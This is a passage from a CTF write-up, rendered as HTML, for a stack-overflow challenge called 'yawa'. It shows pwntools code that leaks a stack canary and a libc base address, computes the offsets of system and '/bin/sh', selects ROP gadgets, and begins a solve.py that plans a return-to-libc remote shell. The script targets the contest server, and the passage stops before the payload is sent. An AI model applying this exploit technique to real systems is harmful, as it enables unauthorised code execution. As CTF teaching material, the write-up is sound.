    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                  <span class="c1"># wait till target binary initialises</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>                    <span class="c1"># send choice 1 - enter value for name</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mi">88</span><span class="p">)</span>               <span class="c1"># enter our name 88 a + &#39;\n&#39; (newline char appended by function sendline - it will overwrite nullbyte of canary)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                  <span class="c1"># wait till binary asks us to make a choice</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>                    <span class="c1"># send choice 2 - print name value</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>                        <span class="c1"># receive all aaaa... till &#39;\n&#39;</span>
    <span class="n">addr_raw</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>     <span class="c1"># receive canary value in little endian order</span>
    <span class="n">addr_raw</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">addr_raw</span>   <span class="c1"># append nullbyte that we skipped</span>
    <span class="k">return</span> <span class="n">unpack</span><span class="p">(</span><span class="n">addr_raw</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>         <span class="c1"># convert to little endian byte array number</span>
</code></pre></div></td></tr></table></div>
<h3 id="leak-libc-address">Leak libc address<a class="headerlink" href="#leak-libc-address" title="Permanent link">&para;</a></h3>
<p>Next step is to find base virtual address of libc, so we can find <code>system</code> call. Address on stack of return address from our
main function is address of <code>__libc_start_call_main</code> - as you might guess its inside libc library. To read address of the function, we can use same technique as
we used previously to reading canary value. When library is loaded into memory, its loaded as a
single blob, so even though virtual location will be different each time, blob content is always same. Therefore we can calculate
position of elements inside the library relative to each other and it won't change doesn't matter where library is loaded:</p>
<p><div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>readelf<span class="w"> </span>-s<span class="w"> </span>./libc.so.6<span class="w">  </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>__libc_start_cal<span class="w">       </span>
<span class="w">     </span><span class="m">6</span>:<span class="w"> </span>0000000000029d10<span class="w">   </span><span class="m">172</span><span class="w"> </span>FUNC<span class="w">    </span>LOCAL<span class="w">  </span>DEFAULT<span class="w">   </span><span class="m">15</span><span class="w"> </span>__libc_start_cal<span class="o">[</span>...<span class="o">]</span>
$<span class="w"> </span>readelf<span class="w"> </span>-s<span class="w"> </span>libc.so.6<span class="w">  </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>system<span class="w">     </span>
<span class="w">  </span><span class="m">8412</span>:<span class="w"> </span>0000000000050d70<span class="w">    </span><span class="m">45</span><span class="w"> </span>FUNC<span class="w">    </span>WEAK<span class="w">   </span>DEFAULT<span class="w">   </span><span class="m">15</span><span class="w"> </span>system
</code></pre></div></td></tr></table></div>
This means that <code>system</code> function will be always <code>0x50d70-0x29d10 = 0x27060</code> bytes apart from <code>__libc_start_call_main</code> function.
For our our sample memory dump we saw return address 0x7ffff7c29d90 - we return to the middle of <code>libc_start_call_main</code>,
so we can infer that libc library is mapped to address <code>0x7ffff7c29d90 - 0x29d90 = 0x7ffff7c00000</code> (segments are typically round numbers).
So <code>system</code> address is <code>0x7ffff7c00000 + 0x50d70 = 0x7ffff7c50d70</code>.</p>
<p>We can also double check our calculations by checking process memory mapping using gdb or cat:</p>
<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">gdb debugger</label><label for="__tabbed_1_2">bash</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span></pre></div></td><td class="code"><div><pre><span></span><code>pwndbg&gt;<span class="w"> </span>info<span class="w"> </span>proc<span class="w"> </span>mappings
process<span class="w"> </span><span class="m">19607</span>
Mapped<span class="w"> </span>address<span class="w"> </span>spaces:

<span class="w">          </span>Start<span class="w"> </span>Addr<span class="w">           </span>End<span class="w"> </span>Addr<span class="w">       </span>Size<span class="w">     </span>Offset<span class="w">  </span>Perms<span class="w">  </span>objfile
<span class="w">      </span>0x555555554000<span class="w">     </span>0x555555555000<span class="w">     </span>0x1000<span class="w">        </span>0x0<span class="w">  </span>r--p<span class="w">   </span>/home/kali/Downloads/yawa_s/yawa_patched
<span class="w">      </span>0x555555555000<span class="w">     </span>0x555555556000<span class="w">     </span>0x1000<span class="w">     </span>0x1000<span class="w">  </span>r-xp<span class="w">   </span>/home/kali/Downloads/yawa_s/yawa_patched
<span class="w">      </span>0x555555556000<span class="w">     </span>0x555555557000<span class="w">     </span>0x1000<span class="w">     </span>0x2000<span class="w">  </span>r--p<span class="w">   </span>/home/kali/Downloads/yawa_s/yawa_patched
<span class="w">      </span>0x555555557000<span class="w">     </span>0x555555558000<span class="w">     </span>0x1000<span class="w">     </span>0x2000<span class="w">  </span>r--p<span class="w">   </span>/home/kali/Downloads/yawa_s/yawa_patched
<span class="w">      </span>0x555555558000<span class="w">     </span>0x55555555b000<span class="w">     </span>0x3000<span class="w">     </span>0x3000<span class="w">  </span>rw-p<span class="w">   </span>/home/kali/Downloads/yawa_s/yawa_patched
<span class="hll"><span class="w">      </span>0x7ffff7c00000<span class="w">     </span>0x7ffff7c28000<span class="w">    </span>0x28000<span class="w">        </span>0x0<span class="w">  </span>r--p<span class="w">   </span>/home/kali/Downloads/yawa_s/libc.so.6
</span><span class="w">      </span>0x7ffff7c28000<span class="w">     </span>0x7ffff7dbd000<span class="w">   </span>0x195000<span class="w">    </span>0x28000<span class="w">  </span>r-xp<span class="w">   </span>/home/kali/Downloads/yawa_s/libc.so.6
<span class="w">      </span>0x7ffff7dbd000<span class="w">     </span>0x7ffff7e15000<span class="w">    </span>0x58000<span class="w">   </span>0x1bd000<span class="w">  </span>r--p<span class="w">   </span>/home/kali/Downloads/yawa_s/libc.so.6
<span class="w">      </span>0x7ffff7e15000<span class="w">     </span>0x7ffff7e16000<span class="w">     </span>0x1000<span class="w">   </span>0x215000<span class="w">  </span>---p<span class="w">   </span>/home/kali/Downloads/yawa_s/libc.so.6
<span class="w">      </span>0x7ffff7e16000<span class="w">     </span>0x7ffff7e1a000<span class="w">     </span>0x4000<span class="w">   </span>0x215000<span class="w">  </span>r--p<span class="w">   </span>/home/kali/Downloads/yawa_s/libc.so.6
<span class="w">      </span>0x7ffff7e1a000<span class="w">     </span>0x7ffff7e1c000<span class="w">     </span>0x2000<span class="w">   </span>0x219000<span class="w">  </span>rw-p<span class="w">   </span>/home/kali/Downloads/yawa_s/libc.so.6
<span class="w">      </span>0x7ffff7e1c000<span class="w">     </span>0x7ffff7e29000<span class="w">     </span>0xd000<span class="w">        </span>0x0<span class="w">  </span>rw-p<span class="w">   </span>
<span class="w">      </span>0x7ffff7fb8000<span class="w">     </span>0x7ffff7fbd000<span class="w">     </span>0x5000<span class="w">        </span>0x0<span class="w">  </span>rw-p<span class="w">   </span>
<span class="w">      </span>0x7ffff7fbd000<span class="w">     </span>0x7ffff7fc1000<span class="w">     </span>0x4000<span class="w">        </span>0x0<span class="w">  </span>r--p<span class="w">   </span><span class="o">[</span>vvar<span class="o">]</span>
<span class="w">      </span>0x7ffff7fc1000<span class="w">     </span>0x7ffff7fc3000<span class="w">     </span>0x2000<span class="w">        </span>0x0<span class="w">  </span>r-xp<span class="w">   </span><span class="o">[</span>vdso<span class="o">]</span>
<span class="w">      </span>0x7ffff7fc3000<span class="w">     </span>0x7ffff7fc5000<span class="w">     </span>0x2000<span class="w">        </span>0x0<span class="w">  </span>r--p<span class="w">   </span>/home/kali/Downloads/yawa_s/ld-2.35.so
<span class="w">      </span>0x7ffff7fc5000<span class="w">     </span>0x7ffff7fef000<span class="w">    </span>0x2a000<span class="w">     </span>0x2000<span class="w">  </span>r-xp<span class="w">   </span>/home/kali/Downloads/yawa_s/ld-2.35.so
<span class="w">      </span>0x7ffff7fef000<span class="w">     </span>0x7ffff7ffa000<span class="w">     </span>0xb000<span class="w">    </span>0x2c000<span class="w">  </span>r--p<span class="w">   </span>/home/kali/Downloads/yawa_s/ld-2.35.so
<span class="w">      </span>0x7ffff7ffb000<span class="w">     </span>0x7ffff7ffd000<span class="w">     </span>0x2000<span class="w">    </span>0x37000<span class="w">  </span>r--p<span class="w">   </span>/home/kali/Downloads/yawa_s/ld-2.35.so
<span class="w">      </span>0x7ffff7ffd000<span class="w">     </span>0x7ffff7fff000<span class="w">     </span>0x2000<span class="w">    </span>0x39000<span class="w">  </span>rw-p<span class="w">   </span>/home/kali/Downloads/yawa_s/ld-2.35.so
<span class="w">      </span>0x7ffffffde000<span class="w">     </span>0x7ffffffff000<span class="w">    </span>0x21000<span class="w">        </span>0x0<span class="w">  </span>rw-p<span class="w">   </span><span class="o">[</span>stack<span class="o">]</span>
</code></pre></div></td></tr></table></div>
</div>
<div class="tabbed-block">
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span></pre></div></td><td class="code"><div><pre><span></span><code>cat<span class="w"> </span>/proc/19607/maps<span class="w"> </span>
<span class="m">555555554000</span>-555555555000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1212715</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/yawa_patched
<span class="m">555555555000</span>-555555556000<span class="w"> </span>r-xp<span class="w"> </span><span class="m">00001000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1212715</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/yawa_patched
<span class="m">555555556000</span>-555555557000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00002000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1212715</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/yawa_patched
<span class="m">555555557000</span>-555555558000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00002000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1212715</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/yawa_patched
<span class="m">555555558000</span>-55555555b000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00003000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1212715</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/yawa_patched
<span class="hll">7ffff7c00000-7ffff7c28000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1213608</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/libc.so.6
</span>7ffff7c28000-7ffff7dbd000<span class="w"> </span>r-xp<span class="w"> </span><span class="m">00028000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1213608</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/libc.so.6
7ffff7dbd000-7ffff7e15000<span class="w"> </span>r--p<span class="w"> </span>001bd000<span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1213608</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/libc.so.6
7ffff7e15000-7ffff7e16000<span class="w"> </span>---p<span class="w"> </span><span class="m">00215000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1213608</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/libc.so.6
7ffff7e16000-7ffff7e1a000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00215000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1213608</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/libc.so.6
7ffff7e1a000-7ffff7e1c000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00219000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1213608</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/libc.so.6
7ffff7e1c000-7ffff7e29000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w"> </span>
7ffff7fb8000-7ffff7fbd000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w"> </span>
7ffff7fbd000-7ffff7fc1000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w">                          </span><span class="o">[</span>vvar<span class="o">]</span>
7ffff7fc1000-7ffff7fc3000<span class="w"> </span>r-xp<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w">                          </span><span class="o">[</span>vdso<span class="o">]</span>
7ffff7fc3000-7ffff7fc5000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1212676</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/ld-2.35.so
7ffff7fc5000-7ffff7fef000<span class="w"> </span>r-xp<span class="w"> </span><span class="m">00002000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1212676</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/ld-2.35.so
7ffff7fef000-7ffff7ffa000<span class="w"> </span>r--p<span class="w"> </span>0002c000<span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1212676</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/ld-2.35.so
7ffff7ffb000-7ffff7ffd000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00037000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1212676</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/ld-2.35.so
7ffff7ffd000-7ffff7fff000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00039000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1212676</span><span class="w">                    </span>/home/kali/Downloads/yawa_s/ld-2.35.so
7ffffffde000-7ffffffff000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w">                          </span><span class="o">[</span>stack<span class="o">]</span>
</code></pre></div></td></tr></table></div>
</div>
</div>
</div>
<p>Code snippet to get libc base address:</p>
<div class="language-py highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">leak libc base address</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">def</span> <span class="nf">get_libc_base_address</span><span class="p">():</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                  <span class="c1"># wait till target binary is ready to read choice</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>                    <span class="c1"># send choice 1 - enter value for name</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mi">103</span><span class="p">)</span>              <span class="c1"># enter name 103 a + &#39;\n&#39; that is appended automatically</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                  <span class="c1"># wait till binary asks us to make a choice</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>                    <span class="c1"># send choice 2 - print name value</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>                        <span class="c1"># receive all aaaa... till &#39;\n&#39;</span>
    <span class="c1"># receive libc_main address in little endian and pad with 0</span>
    <span class="n">addr_libc_main</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">addr_libc_main</span> <span class="o">=</span> <span class="n">addr_libc_main</span> <span class="o">+</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr_libc_main</span><span class="p">))</span>
    <span class="c1"># convert from little to big endian and subtract return offset to get base address of libc</span>
    <span class="k">return</span> <span class="n">unpack</span><span class="p">(</span><span class="n">addr_libc_main</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0x29d90</span>
</code></pre></div></td></tr></table></div>
<h3 id="remote-shell">Remote shell<a class="headerlink" href="#remote-shell" title="Permanent link">&para;</a></h3>
<p>With canary value and libc address in hands we are ready to get remote shell. Given there is NX protection and stack code
is not executable we will use <abbr title="Return-Oriented Programming">ROP</abbr> (more on <a href="https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming">ironstone</a>) to execute return to libc technique.
First we need to get address of string "/bin/sh" in libc library (<code>system</code> function takes argument what to launch):</p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1"># strings -a -t x libc.so.6 | grep /bin/sh</span>
<span class="nv">sh_offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x1d8678
</code></pre></div></td></tr></table></div>
<p>Using <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> we find tons of useful gadgets in libc library:
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>libc.so.6<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>ret
</code></pre></div></td></tr></table></div>
I've selected few that will help me to build return to libc chain:</p>
<ul>
<li>0x000000000002a3e5: pop rdi</li>
<li>0x00000000000baaf9: xor rax, rax, ret</li>
</ul>
<p>With all of this our payload will look like:</p>
<ol>
<li>88 bytes of padding for buffer</li>
<li>8 bytes of canary value</li>
<li>8 bytes value of 1 - unchanged</li>
<li>8 bytes pop rdi gadget</li>
<li>8 bytes address of "/bin/sh" string (this is argument for pop rdi gadget). As a result we set register RDI to /bin/sh</li>
<li>8 bytes xor rax, rax, ret - this is NOP operation for <a href="https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/stack-alignment">stack alignment</a></li>
<li>8 bytes address for <code>system</code> call</li>
</ol>
<p>Full python script:</p>
<details class="success">
<summary>solve.py</summary>
<div class="language-py highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span>
<span class="normal">52</span>
<span class="normal">53</span>
<span class="normal">54</span>
<span class="normal">55</span>
<span class="normal">56</span>
<span class="normal">57</span>
<span class="normal">58</span>
<span class="normal">59</span>
<span class="normal">60</span>
<span class="normal">61</span>
<span class="normal">62</span>
<span class="normal">63</span>
<span class="normal">64</span>
<span class="normal">65</span>
<span class="normal">66</span>
<span class="normal">67</span>
<span class="normal">68</span>
<span class="normal">69</span>
<span class="normal">70</span>
<span class="normal">71</span>
<span class="normal">72</span>
<span class="normal">73</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elfexe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/yawa_patched&#39;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elfexe</span><span class="o">.</span><span class="n">libc</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;warn&#39;</span>

<span class="n">arguments</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
    <span class="n">remote_server</span> <span class="o">=</span> <span class="s1">&#39;2024.ductf.dev&#39;</span>
    <span class="n">remote_port</span> <span class="o">=</span> <span class="mi">30010</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_server</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">elfexe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">arguments</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_canary_value</span><span class="p">():</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                  <span class="c1"># wait till target binary initialises</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>                    <span class="c1"># send choice 1 - enter value for name</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mi">88</span><span class="p">)</span>               <span class="c1"># enter our name 88 a + &#39;\n&#39; (newline char appended by function sendline - it will overwrite nullbyte of canary)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                  <span class="c1"># wait till binary asks us to make a choice</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>                    <span class="c1"># send choice 2 - print name value</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>                        <span class="c1"># receive all aaaa... till &#39;\n&#39;</span>
    <span class="n">addr_raw</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>     <span class="c1"># receive canary value in little endian order</span>
    <span class="n">addr_raw</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">addr_raw</span>   <span class="c1"># append nullbyte that we skipped</span>
    <span class="k">return</span> <span class="n">unpack</span><span class="p">(</span><span class="n">addr_raw</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>         <span class="c1"># convert to little endian byte array number</span>

<span class="k">def</span> <span class="nf">get_libc_base_address</span><span class="p">():</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                  <span class="c1"># wait till target binary is ready to read choice</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>                    <span class="c1"># send choice 1 - enter value for name</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mi">103</span><span class="p">)</span>              <span class="c1"># enter name 103 a + &#39;\n&#39; that is appended automatically</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>                  <span class="c1"># wait till binary asks us to make a choice</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>                    <span class="c1"># send choice 2 - print name value</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>                        <span class="c1"># receive all aaaa... till &#39;\n&#39;</span>
    <span class="c1"># receive libc_main address in little endian and convert it to number</span>
    <span class="n">addr_libc_main</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">addr_libc_main</span> <span class="o">=</span> <span class="n">addr_libc_main</span> <span class="o">+</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr_libc_main</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">unpack</span><span class="p">(</span><span class="n">addr_libc_main</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0x29d90</span>


<span class="n">canary</span> <span class="o">=</span> <span class="n">get_canary_value</span><span class="p">()</span>
<span class="c1"># set base address of libc library so we can use pwntools to convert offsets to virtual addresses</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">get_libc_base_address</span><span class="p">()</span> 

<span class="c1"># strings -a -t x libc.so.6 | grep /bin/sh</span>
<span class="n">sh_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">offset_to_vaddr</span><span class="p">(</span><span class="mh">0x1d8678</span><span class="p">)</span>
<span class="c1"># readelf -s libc.so.6 | grep system</span>
